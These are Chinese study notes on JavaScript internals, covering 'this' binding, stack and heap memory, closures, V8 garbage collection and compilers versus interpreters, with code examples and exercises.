默认情况下调用一个函数，其执行上下文中的 this 也是指向 window 对象的。

置函数执行上下文中的 this 值:

1. **通过函数的 call 方法设置**

   ```js
   let bar = {
     myName: '极客邦',
     test1: 1
   };
   function foo() {
     this.myName = '极客时间';
   }
   foo.call(bar);
   console.log(bar);
   console.log(myName);
   ```

   除了 call 方法，还可以使用 bind 和 apply 方法来设置函数执行上下文中的 this。

2. **通过对象调用方法设置**

   ```js
   var myObj = {
     name: '极客时间',
     showThis: function () {
       console.log(this);
     }
   };
   myObj.showThis();
   ```

   使用对象来调用其内部的一个方法，该方法的 this 是指向对象本身的。

   ```js
   var myObj = {
     name: '极客时间',
     showThis: function () {
       this.name = '极客邦';
       console.log(this);
     }
   };
   var foo = myObj.showThis;
   foo();
   ```

   - 在全局环境中调用一个函数，函数内部的 this 指向的是全局变量 window。
   - 通过一个对象来调用其内部的一个方法，该方法的执行上下文中的 this 指向对象本身。

3. **通过构造函数中设置**

   ```js
   function CreateObj() {
     this.name = '极客时间';
   }
   var myObj = new CreateObj();
   ```

   使用 new 创建对象

   [new](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new)

   当执行 new CreateObj() 的时候，JavaScript 引擎做了如下四件事：

   1. 首先创建了一个空对象 tempObj；

   2. 接着调用 CreateObj.call 方法，并将 tempObj 作为 call 方法的参数，这样当 CreateObj 的执行上下文创建时，它的 this 就指向了 tempObj 对象；

   3. 然后执行 CreateObj 函数，此时的 CreateObj 函数执行上下文中的 this 指向了 tempObj 对象；

   4. 最后返回 tempObj 对象。

      ```js
      var tempObj = {};
      CreateObj.call(tempObj);
      return tempObj;
      ```

#### this 的设计缺陷以及应对方案

this 并不是一个很好的设计，因为它的很多使用方法都冲击人的直觉，在使用过程中存在着非常多的坑。

1. **嵌套函数中的 this 不会从外层函数中继承**

   ```js
   var myObj = {
     name: '极客时间',
     showThis: function () {
       console.log(this);
       function bar() {
         console.log(this);
       }
       bar();
     }
   };
   myObj.showThis();

   var myObj = {
     name: '极客时间',
     showThis: function () {
       console.log(this);
       var self = this;
       function bar() {
         self.name = '极客邦';
       }
       bar();
     }
   };
   myObj.showThis();
   console.log(myObj.name);
   console.log(window.name);

   // 这个方法的的本质是把 this 体系转换为了作用域的体系。**********************************

   var myObj = {
     name: '极客时间',
     showThis: function () {
       console.log(this);
       var bar = () => {
         this.name = '极客邦';
         console.log(this);
       };
       bar();
     }
   };
   myObj.showThis();
   console.log(myObj.name);
   console.log(window.name);
   //ES6 中的箭头函数并不会创建其自身的执行上下文，所以箭头函数中的 this 取决于它的外部函数。
   ```

   this 没有作用域的限制，这点和变量不一样，所以嵌套函数不会从调用它的函数中继承 this，这样会造成很多不符合直觉的代码。要解决这个问题，你可以有两种思路：

   - 第一种是把 this 保存为一个 self 变量，再利用变量的作用域机制传递给嵌套函数。
   - 第二种是继续使用 this，但是要把嵌套函数改为箭头函数，因为箭头函数没有自己的执行上下文，所以它会继承调用函数中的 this。

2. **普通函数中的 this 默认指向全局对象 window**

   在默认情况下调用一个函数，其执行上下文中的 this 是默认指向全局对象 window 的。不过这个设计也是一种缺陷，因为在实际工作中，我们并不希望函数执行上下文中的 this 默认指向全局对象，因为这样会打破数据的边界，造成一些误操作。如果要让函数执行上下文中的 this 指向某个对象，最好的方式是通过 call 方法来显示调用。

   这个问题可以通过设置 JavaScript 的“严格模式”来解决。在严格模式下，默认执行一个函数，其函数的执行上下文中的 this 值是 undefined，这就解决上面的问题了。

问题：

```js
let userInfo = {
  name: 'jack.ma',
  age: 13,
  sex: male,
  updateInfo: function () {
    //模拟xmlhttprequest请求延时
    setTimeout(function () {
      this.name = 'pony.ma';
      this.age = 39;
      this.sex = female;
    }, 100);
  }
};

userInfo.updateInfo();
```

要求：通过 updateInfo 来更新 userInfo 里面的数据信息

回答：

```js
// 修改方法一：箭头函数最方便
let userInfo = {
  name: 'jack.ma',
  age: 13,
  sex: 'male',
  updateInfo: function () {
    // 模拟 xmlhttprequest 请求延时
    setTimeout(() => {
      this.name = 'pony.ma';
      this.age = 39;
      this.sex = 'female';
    }, 100);
  }
};

userInfo.updateInfo();
setTimeout(() => {
  console.log(userInfo);
}, 200);

// 修改方法二：缓存外部的this
let userInfo = {
  name: 'jack.ma',
  age: 13,
  sex: 'male',
  updateInfo: function () {
    let me = this;
    // 模拟 xmlhttprequest 请求延时
    setTimeout(function () {
      me.name = 'pony.ma';
      me.age = 39;
      me.sex = 'female';
    }, 100);
  }
};

userInfo.updateInfo();
setTimeout(() => {
  console.log(userInfo);
}, 200);

// 修改方法三，其实和方法二的思路是相同的
let userInfo = {
  name: 'jack.ma',
  age: 13,
  sex: 'male',
  updateInfo: function () {
    // 模拟 xmlhttprequest 请求延时
    void (function (me) {
      setTimeout(function () {
        me.name = 'pony.ma';
        me.age = 39;
        me.sex = 'female';
      }, 100);
    })(this);
  }
};

userInfo.updateInfo();
setTimeout(() => {
  console.log(userInfo);
}, 200);

let update = function () {
  this.name = 'pony.ma';
  this.age = 39;
  this.sex = 'female';
};

方法四: 利用call或apply修改函数被调用时的this值(不知掉这么描述正不正确);
let userInfo = {
  name: 'jack.ma',
  age: 13,
  sex: 'male',
  updateInfo: function () {
    // 模拟 xmlhttprequest 请求延时
    setTimeout(function () {
      update.call(userInfo);
      // update.apply(userInfo)
    }, 100);
  }
};

userInfo.updateInfo();
setTimeout(() => {
  console.log(userInfo);
}, 200);

// 方法五: 利用bind返回一个新函数，新函数被调用时的this指定为userInfo
let userInfo = {
  name: 'jack.ma',
  age: 13,
  sex: 'male',
  update: function () {
    this.name = 'pony.ma';
    this.age = 39;
    this.sex = 'female';
  },
  updateInfo: function () {
    // 模拟 xmlhttprequest 请求延时
    setTimeout(this.update.bind(this), 100);
  }
};
```

如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象。 如果是严格模式，那么 this 会被设置为 undefined。

箭头函数在执行时比块级作用域的内容多，比函数执行上下文的内容少，砍掉了很多函数执行上下文中的组件。 不过在箭头函数在执行时也是有变量环境的，因为还要支持变量提升！所以变量环境的模块还是砍不掉的。

this 的缺陷并不是浏览器实现机制导致的，而是浏览器按照标准来实现的。 其实浏览器说我可以实现得更好，但是标准摆在这儿，大家都只认标准！

## 栈空间和堆空间

JavaScript 的内存机制，**JavaScript 中的数据是如何存储在内存中的**。JavaScript 并不需要直接去管理内存，但是在实际项目中为了能避开一些不必要的坑，你还是需要了解数据在内存中的存储方式的。

```js
function foo() {
  var a = 1;
  var b = a;
  a = 2;
  console.log(a);
  console.log(b);
}
foo();

function foo() {
  var a = { name: '极客时间' };
  var b = a;
  a.name = '极客邦';
  console.log(a);
  console.log(b);
}
foo();
```

#### JavaScript 是什么类型的语言

每种编程语言都具有**内建的数据类型**，但它们的数据类型常有不同之处，使用方式也很不一样，比如 C 语言在定义变量之前，就需要确定变量的类型，你可以看下面这段 C 代码：

```c
int main()
{
   int a = 1;
   char* b = "极客时间";
   bool c = true;
   return 0;
}
```

在声明变量之前需要先定义变量类型。我们把这种在使用之前就需要确认其变量数据类型的称为**静态语言**。

在运行过程中需要检查数据类型的语言称为**动态语言**。

虽然 C 语言是静态，但是在 C 语言中，我们可以把其他类型数据赋予给一个声明好的变量，如：

```c
c = a
```

前面代码中，我们把 int 型的变量 a 赋值给了 bool 型的变量 c，这段代码也是可以编译执行的，因为在赋值过程中，C 编译器会把 int 型的变量悄悄转换为 bool 型的变量，我们通常把这种**偷偷转换的操作称为隐式类型转换**。而支持隐式类型转换的语言称为**弱类型语言**，不支持隐式类型转换的语言称为**强类型语言**。

![img](https://static001.geekbang.org/resource/image/36/f0/36f0f5bdce0a6d8c36cbb8a76931cff0.png?wh=1142*815)

- 弱类型，意味着你不需要告诉 JavaScript 引擎这个或那个变量是什么数据类型，JavaScript 引擎在运行代码的时候自己会计算出来。
- 动态，意味着你可以使用同一个变量保存不同类型的数据。

```js
var bar;
bar = 12;
bar = '极客时间';
bar = true;
bar = null;
bar = { name: '极客时间' };

var bar;
console.log(typeof bar); //undefined
bar = 12;
console.log(typeof bar); //number
bar = '极客时间';
console.log(typeof bar); //string
bar = true;
console.log(typeof bar); //boolean
bar = null;
console.log(typeof bar); //object
bar = { name: '极客时间' };
console.log(typeof bar); //object
```

JavaScript 到底有多少种数据类型:

![img](https://static001.geekbang.org/resource/image/85/15/85b87602eac65356c9171bbd023f5715.png?wh=1142*648)

第一点，使用 typeof 检测 Null 类型时，返回的是 Object。这是当初 JavaScript 语言的一个 Bug，一直保留至今，之所以一直没修改过来，主要是为了兼容老的代码。

第二点，Object 类型比较特殊，它是由上述 7 种类型组成的一个包含了 key-value 对的数据类型。如下所示：

```js
let myObj = {
    name:'极客时间',
    update:function(){....}
}
```

第三点，我们把前面的 7 种数据类型称为原始类型，把最后一个对象类型称为引用类型，之所以把它们区分为两种不同的类型，是**因为它们在内存中存放的位置不一样**。

#### 内存空间

要理解 JavaScript 在运行过程中**数据是如何存储的**，你就得先搞清楚其**存储空间的种类**。下面是我画的 JavaScript 的内存模型，你可以参考下：

![img](https://static001.geekbang.org/resource/image/62/57/6293f5315a5bafbd3ba00ee732bfbf57.png?wh=1142*1183)

在 JavaScript 的执行过程中， 主要有三种类型内存空间，分别是代码空间、栈空间和堆空间。

代码空间主要是存储可执行代码。

#### 栈空间和堆空间

这里的栈空间就是我们之前反复提及的调用栈，是用来存储执行上下文的。为了搞清楚栈空间是如何存储数据的，我们还是先看下面这段代码：

```js
function foo() {
  var a = '极客时间';
  var b = a;
  var c = { name: '极客时间' };
  var d = c;
}
foo();
```

当执行一段代码时，需要先编译，并创建执行上下文，然后再按照顺序执行代码。当执行到第 3 行代码时，其调用栈的状态，你可以参考下面这张调用栈状态图：

![img](https://static001.geekbang.org/resource/image/94/fe/9411221e463a86d043a3461d49c9f1fe.png?wh=1142*716)

从图中可以看出来，当执行到第 3 行时，**变量 a 和变量 b 的值都被保存在执行上下文中，而执行上下文又被压入到栈中，所以你也可以认为变量 a 和变量 b 的值都是存放在栈中的。**

接下来继续执行第 4 行代码，由于 JavaScript 引擎判断右边的值是一个引用类型，这时候处理的情况就不一样了，JavaScript 引擎并不是直接将该对象存放到变量环境中，而是将它分配到堆空间里面，分配后该对象会有一个在“堆”中的地址，然后再将该数据的地址写进 c 的变量值，最终分配好内存的示意图如下所示：

![img](https://static001.geekbang.org/resource/image/22/bc/22100df5c75fb51037d7a929777c57bc.png?wh=1142*551)

对象类型是存放在堆空间的，在栈空间中只是保留了对象的引用地址，当 JavaScript 需要访问该数据的时候，是通过栈中的引用地址来访问的，相当于多了一道转手流程。

**原始类型的数据值都是直接保存在“栈”中的，引用类型的值是存放在“堆”中的。**

为什么一定要分“堆”和“栈”两个存储空间呢？所有数据直接存放在“栈”中不就可以了吗？

答案是不可以的。这是因为 JavaScript 引擎需要用栈来维护程序执行期间上下文的状态，如果栈空间大了话，所有的数据都存放在栈空间里面，那么会影响到上下文切换的效率，进而又影响到整个程序的执行效率。比如文中的 foo 函数执行结束了，JavaScript 引擎需要离开当前的执行上下文，只需要将指针下移到上个执行上下文的地址就可以了，foo 函数执行上下文栈区空间全部回收，具体过程你可以参考下图：

![img](https://static001.geekbang.org/resource/image/d7/7b/d7153d003a72dbd0a9ca84b59ac3857b.png?wh=1142*532)

所以通常情况下，栈空间都不会设置太大，主要用来存放一些原始类型的小数据。而引用类型的数据占用的空间都比较大，所以这一类数据会被存放到堆中，堆空间很大，能存放很多大的数据，不过缺点是分配内存和回收内存都会占用一定的时间。

解释了程序在执行过程中为什么需要堆和栈两种数据结构后，我们还是回到示例代码那里，看看它最后一步将变量 c 赋值给变量 d 是怎么执行的？

在 JavaScript 中，赋值操作和其他语言有很大的不同，原始类型的赋值会完整复制变量值，而引用类型的赋值是复制引用地址。

所以 d=c 的操作就是把 c 的引用地址赋值给 d，你可以参考下图：

![img](https://static001.geekbang.org/resource/image/51/f5/51127624a725a18a0e12e0f5a7aadbf5.png?wh=1142*560)

#### 再谈闭包

作用域内的原始类型数据会被存储到栈空间，引用类型会被存储到堆空间。

```js
function foo() {
  var myName = '极客时间';
  let test1 = 1;
  const test2 = 2;
  var innerBar = {
    setName: function (newName) {
      myName = newName;
    },
    getName: function () {
      console.log(test1);
      return myName;
    }
  };
  return innerBar;
}
var bar = foo();
bar.setName('极客邦');
bar.getName();
console.log(bar.getName());
```

当执行这段代码的时候，你应该有过这样的分析：由于变量 myName、test1、test2 都是原始类型数据，所以在执行 foo 函数的时候，它们会被压入到调用栈中；当 foo 函数执行结束之后，调用栈中 foo 函数的执行上下文会被销毁，其内部变量 myName、test1、test2 也应该一同被销毁。

但是在前面，介绍了当 foo 函数的执行上下文销毁时，由于 foo 函数产生了闭包，所以变量 myName 和 test1 并没有被销毁，而是保存在内存中，那么应该如何解释这个现象呢？

要解释这个现象，我们就得站在内存模型的角度来分析这段代码的执行流程。

1. 当 JavaScript 引擎执行到 foo 函数时，首先会编译，并创建一个空执行上下文。
2. 在编译过程中，遇到内部函数 setName，JavaScript 引擎还要对内部函数做一次快速的词法扫描，发现该内部函数引用了 foo 函数中的 myName 变量，由于是内部函数引用了外部函数的变量，所以 JavaScript 引擎判断这是一个闭包，于是在堆空间创建一个“closure(foo)”的对象（这是一个内部对象，JavaScript 是无法访问的），用来保存 myName 变量。
3. 接着继续扫描到 getName 方法时，发现该函数内部还引用变量 test1，于是 JavaScript 引擎又将 test1 添加到“closure(foo)”对象中。这时候堆中的“closure(foo)”对象中就包含了 myName 和 test1 两个变量了。
4. 由于 test2 并没有被内部函数引用，所以 test2 依然保存在调用栈中。

通过上面的分析，我们可以画出执行到 foo 函数中“return innerBar”语句时的调用栈状态，如下图所示：

![img](https://static001.geekbang.org/resource/image/f9/db/f9dd29ff5371c247e10546393c904edb.png?wh=1142*564)

从上图你可以清晰地看出，当执行到 foo 函数时，闭包就产生了；当 foo 函数执行结束之后，返回的 getName 和 setName 方法都引用“closure(foo)”对象，所以即使 foo 函数退出了，“ closure(foo)”依然被其内部的 getName 和 setName 方法引用。所以在下次调用 bar.setName 或者 bar.getName 时，创建的执行上下文中就包含了“closure(foo)”。

总的来说，产生闭包的核心有两步：第一步是需要预扫描内部函数；第二步是把内部函数引用的外部变量保存到堆中。

JavaScript 的变量是没有数据类型的，值才有数据类型，变量可以随时持有任何类型的数据。

问题：如何将对象 jack 拷贝给 jack2，然后在完成拷贝操作时两个 jack 还互不影响。

```js
let jack = {
  name: 'jack.ma',
  age: 40,
  like: {
    dog: {
      color: 'black',
      age: 3
    },
    cat: {
      color: 'white',
      age: 2
    }
  }
};
function copy(src) {
  let dest;
  //实现拷贝代码，将src的值完整地拷贝给dest
  //在这里实现
  return dest;
}
let jack2 = copy(jack);

//比如修改jack2中的内容，不会影响到jack中的值
jack2.like.dog.color = 'green';
console.log(jack.like.dog.color); //打印出来的应该是 "black"
```

问：

1、从内存模型角度分析执行代码的执行流程第二步看，在堆空间创建 closure(foo)对象，它是存储在 foo 函数的执行上下文中的。 那么 closure(foo)创建开始时是空对象，执行第三步的时候，才会逐渐把变量添加到其中。 2、当 foo 函数执行结束后，foo 的执行上下文是不是销毁了？如果销毁了，产生一下两个疑问： a、如果 foo 函数执行上下文销毁了，closure(foo)并没有销毁，那 foo 函数执行上下文是怎么销毁的呢？就比如销毁一个盒子，盒子毁里，里面的东西应该也是毁掉的 b、既然 closure(foo)既然没有销毁，那它存储在堆中的什么地方呢？必定它所依赖的 foo 执行上下文已经不存在了

> 作者回复: 关于 foo 函数执行上下文销毁过程：foo 函数执行结束之后，当前执行状态的指针下移到栈中的全局执行上下文的位置，foo 函数的执行上下文的那块数据就挪出来，这也就是 foo 函数执行上下文的销毁过程，这个文中有提到，你可以参考“调用栈中切换执行上下文状态“图。 第二个问题：innerBar 返回后，含有 setName 和 getName 对象，这两个对象里面包含了堆中的 closure(foo)的引用。虽然 foo 执行上下文销毁了，foo 函数中的对 closure(foo)的引用也断开了，但是 setName 和 getName 里面又重新建立起来了对 closure(foo)引用。 你可以：
>
> 1:打开“开发者工具”
>
> 2:在控制台执行上述代码
>
> 3:然后选择“Memory”标签，点击"take snapshot" 获取 V8 的堆内存快照。
>
> 4:然后“command+f"(mac) 或者 "ctrl+f"(win),搜索“setName”，然后你就会发现 setName 对象下面包含了 raw_outer_scope_info_or_feedback_metadata，对闭包的引用数据就在这里面。

# 垃圾回收

有些数据被使用之后，可能就不再需要了，我们把这种数据称为垃圾数据。如果这些垃圾数据一直保存在内存中，那么内存会越用越多，所以我们需要对这些垃圾数据进行回收，以释放有限的内存空间。

#### 不同语言的垃圾回收策略

通常情况下，垃圾数据回收分为**手动回收和自动回收**两种策略。

如 C/C++ 就是使用手动回收策略，何时分配内存、何时销毁内存都是由代码控制的，你可以参考下面这段 C 代码：

```js
//在堆中分配内存
char* p =  (char*)malloc(2048);  //在堆空间中分配2048字节的空间，并将分配后的引用地址保存到p中

//使用p指向的内存
{
    //....
}

//使用结束后，销毁这段内存
free(p)；
p = NULL；
```

从上面这段 C 代码可以看出来，要使用堆中的一块空间，我们需要先调用 mallco 函数分配内存，然后再使用；当不再需要这块数据的时候，就要手动调用 free 函数来释放内存。如果这段数据已经不再需要了，但是又没有主动调用 free 函数来销毁，那么这种情况就被称为内存泄漏。

另外一种使用的是自动垃圾回收的策略，如 JavaScript、Java、Python 等语言，产生的垃圾数据是由垃圾回收器来释放的，并不需要手动通过代码来释放。

因为数据是存储在栈和堆两种内存空间中的，所以接下来我们就来分别介绍“栈中的垃圾数据”和“堆中的垃圾数据”是如何回收的。

#### 调用栈中的数据是如何回收的

```js
function foo() {
  var a = 1;
  var b = { name: ' 极客邦 ' };
  function showName() {
    var c = ' 极客时间 ';
    var d = { name: ' 极客时间 ' };
  }
  showName();
}
foo();
```

当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：

![image-20220404155807878](.\typora-user-images\image-20220404155807878.png)

当 foo 函数执行结束之后，foo 函数的执行上下文会从堆中被销毁掉，那么它是怎么被销毁的呢？

如果执行到 showName 函数时，那么 JavaScript 引擎会创建 showName 函数的执行上下文，并将 showName 函数的执行上下文压入到调用栈中，最终执行到 showName 函数时，其调用栈就如上图所示。与此同时，还有一个**记录当前执行状态的指针（称为 ESP）**，指向调用栈中 showName 函数的执行上下文，表示当前正在执行 showName 函数。

当 showName 函数执行完成之后，函数执行流程就进入了 foo 函数，那这时就需要销毁 showName 函数的执行上下文了。JavaScript 会将 ESP 下移到 foo 函数的执行上下文，**这个下移操作就是销毁 showName 函数执行上下文的过程**。

ESP 指针向下移动怎么就能把 showName 的执行上下文销毁了呢？具体可以看下面这张移动 ESP 前后的对比图：

![image-20220404162009384](.\typora-user-images\image-20220404162009384.png)

从图中可以看出，当 showName 函数执行结束之后，ESP 向下移动到 foo 函数的执行上下文中，上面 showName 的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当 foo 函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。

所以说，当一个函数执行结束之后，**JavaScript 引擎会通过向下移动 ESP 来销毁该函数保存在栈中的执行上下文**。

#### 堆中的数据是如何回收的

当上面那段代码的 foo 函数执行结束之后，ESP 应该是指向全局执行上下文的，那这样的话，showName 函数和 foo 函数的执行上下文就处于无效状态了，不过保存在堆中的两个对象依然占用着空间，如下图所示：

![image-20220404162137498](.\typora-user-images\image-20220404162137498.png)

从图中可以看出，1003 和 1050 这两块内存依然被占用。**要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器了**。

堆中的垃圾数据是如何回收?

前置知识：

**代际假说**：

- 大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问；
- 有些对象存在的时间会更长

垃圾回收算法有很多种，但是并没有哪一种能胜任所有的场景，你需要权衡各种场景，根据对象的生存周期的不同而使用不同的算法，以便达到最好的效果。

所以，在 V8 中会把堆分为**新生代**和**老生代**两个区域，**新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象**。新生区通常只支持 1 ～ 8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。

- **副垃圾回收器，主要负责新生代的垃圾回收。**
- **主垃圾回收器，主要负责老生代的垃圾回收。**

#### 垃圾回收器的工作流程

**不论什么类型的垃圾回收器，它们都有一套共同的执行流程**。

第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。

第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。

第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为**内存碎片**。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。所以最后一步需要整理这些内存碎片，但这步其实是可选的，因为有的垃圾回收器不会产生内存碎片，比如接下来我们要介绍的副垃圾回收器。

##### 副垃圾回收器

副垃圾回收器主要负责新生区的垃圾回收。而通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。

新生代中用**Scavenge 算法**来处理。所谓 Scavenge 算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，如下图所示：

![image-20220404162722571](.\typora-user-images\image-20220404162722571.png)

新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。

在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。

完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种**角色翻转的操作还能让新生代中的这两块区域无限重复使用下去**。

由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以**为了执行效率，一般新生区的空间会被设置得比较小**。

也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了**对象晋升策略**，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。

##### 主垃圾回收器

主垃圾回收器主要负责老生区中的垃圾回收。除了新生区中晋升的对象，一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。

由于老生区的对象比较大，若要在老生区中使用 Scavenge 算法进行垃圾回收，复制这些大的对象将会花费比较多的时间，从而导致回收执行效率不高，同时还会浪费一半的空间。因而，主垃圾回收器是采用**标记 - 清除（Mark-Sweep）**的算法进行垃圾回收的。下面我们来看看该算法是如何工作的。

首先是标记过程阶段。标记阶段就是从遍历调用栈中的一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为**活动对象**，没有到达的元素就可以判断为**垃圾数据**。

比如最开始的那段代码，当 showName 函数执行退出之后，这段代码的调用栈和堆空间如下图所示：

![image-20220404163129854](.\typora-user-images\image-20220404163129854.png)

从上图你可以大致看到垃圾数据的标记过程，当 showName 函数执行结束之后，ESP 向下移动，指向了 foo 函数的执行上下文，这时候如果遍历调用栈，是不会找到引用 1003 地址的变量，也就意味着 1003 这块数据为垃圾数据，被标记为红色。由于 1050 这块数据被变量 b 引用了，所以这块数据会被标记为活动对象。这就是大致的标记过程。

接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，你可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：

![image-20220404163337475](.\typora-user-images\image-20220404163337475.png)

上面的标记过程和清除过程就是标记 - 清除算法，不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法——**标记 - 整理（Mark-Compact）**，这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。你可以参考下图：

![image-20220404163418142](.\typora-user-images\image-20220404163418142.png)

##### 全停顿

由于 JavaScript 是运行在主线程之上的，一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做**全停顿（Stop-The-World）**。

比如堆中的数据有 1.5GB，V8 实现一次完整的垃圾回收需要 1 秒以上的时间，这也是由于垃圾回收而引起 JavaScript 线程暂停执行的时间，若是这样的时间花销，那么应用的性能和响应能力都会直线下降。主垃圾回收器执行一次完整的垃圾回收流程如下图所示：

![image-20220404163634067](.\typora-user-images\image-20220404163634067.png)

在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样了。如果在执行垃圾回收的过程中，占用主线程时间过久，就像上面图片展示的那样，花费了 200 毫秒，在这 200 毫秒内，主线程是不能做其他事情的。比如页面正在执行一个 JavaScript 动画，因为垃圾回收器在工作，就会导致这个动画在这 200 毫秒内无法执行的，这将会造成页面的卡顿现象。

为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为**增量标记（Incremental Marking）算法**。如下图所示：

![image-20220404163744913](.\typora-user-images\image-20220404163744913.png)

使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行，这样当执行上述动画效果时，就不会让用户因为垃圾回收任务而感受到页面的卡顿了。

#### 问题：

你是如何判断 JavaScript 中内存泄漏的？

- 一般是感官上的长时间运行页面卡顿，猜可能会有内存泄漏。通过 DynaTrace（IE）profiles，Chrome 开发者工具中的 Performance 等工具一段时间收集数据，观察对象的使用情况。然后判断是否存在内存泄漏。修改后验证

- 工作中避免内存泄漏方法：确定不使用的临时变量置为 null，当前 es6 普及场景下少使用闭包也是一种方法。

新生区和老生区标记过程是同一个过程，之后新生代把存活的数据移动到空闲区，老生代把死去的对象加到空闲列表中。

对于栈中的垃圾回收，是通过移动 ESP 指针来实现的，是不需要通过 V8 的垃圾回收机制的吗？是的，栈中的过期数据直接通过 esp 给抹掉，效率非常高。

会的，副垃圾回收器执行速度快，而且容易满，所以回收频率会比主垃圾回收器高。

栈垃圾回收 当函数执行结束，JS 引擎通过向下移动 ESP 指针（记录调用栈当前执行状态的指针），来销毁该函数保存在栈中的执行上下文（变量环境、词法环境、this、outer）。

堆垃圾回收

一、代际假说

1、大部分对象存活时间很短

2、不被销毁的对象，会活的更久

二、分类 V8 中会把堆分为新生代和老生代两个区域，新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象。

三、新生代 算法：Scavenge 算法

原理：

1、把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域。

2、新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。

3、先对对象区域中的垃圾做标记，标记完成之后，把这些存活的对象复制到空闲区域中

4、完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。 对象晋升策略： 经过两次垃圾回收依然还存活的对象，会被移动到老生区中。

四、老生代

算法：标记 - 清除（Mark-Sweep）算法

原理：

1、标记：标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为活动对象，没有到达的元素就可以判断为垃圾数据。

2、清除：将垃圾数据进行清除。 碎片： 对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存。

算法：标记 - 整理（Mark-Compact）算法

原理： 1、标记：和标记 - 清除的标记过程一样，从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素标记为活动对象。

2、整理：让所有存活的对象都向内存的一端移动

3、清除：清理掉端边界以外的内存

优化算法：增量标记（Incremental Marking）算法

原理：

1、为了降低老生代的垃圾回收而造成的卡顿

2、V8 把一个完整的垃圾回收任务拆分为很多小的任务

3、让垃圾回收标记和 JavaScript 应用逻辑交替进行

# 编译器和解释器

V8 执行 JavaScript 的过程。

深入理解前端工具和框架（语言转换器 Babel、语法检查工具 ESLint、前端框架 Vue 和 React 的一些底层实现机制），就需要这些本质的知识，然后才能理解这些上层应用。

前置的概念：**编译器（Compiler）、解释器（Interpreter）、抽象语法树（AST）、字节码（Bytecode）、即时编译器（JIT）**等概念。

### 编译器和解释器

计算机不能直接理解我们所写的代码，所以在执行程序之前，需要将我们所写的代码“翻译“（编译器和解释器）成机器能读懂的机器语言。按语言的执行流程，可以把语言划分为编译型语言和解释型语言。

**编译型语言在程序执行之前，需要经过编译器的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了**。比如 C/C++、GO 等都是编译型语言。

**而由解释型语言编写的程序，在每次运行时都需要通过解释器对程序进行动态解释和执行**。比如 Python、JavaScript 等都属于解释型语言。

![image-20220404180759941](.\typora-user-images\image-20220404180759941.png)

1. 在编译型语言的编译过程中，**编译器**首先会依次对源代码进行**词法分析、语法分析，生成抽象语法树（AST）**，然后是**优化代码**，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。
2. 在解释型语言的解释过程中，**解释器**也会对源代码进行**词法分析、语法分析，并生成抽象语法树（AST）**，不过它会再基于抽象语法树生成**字节码**，最后再根据字节码来执行程序、输出结果。

### V8 执行一段 JS 代码

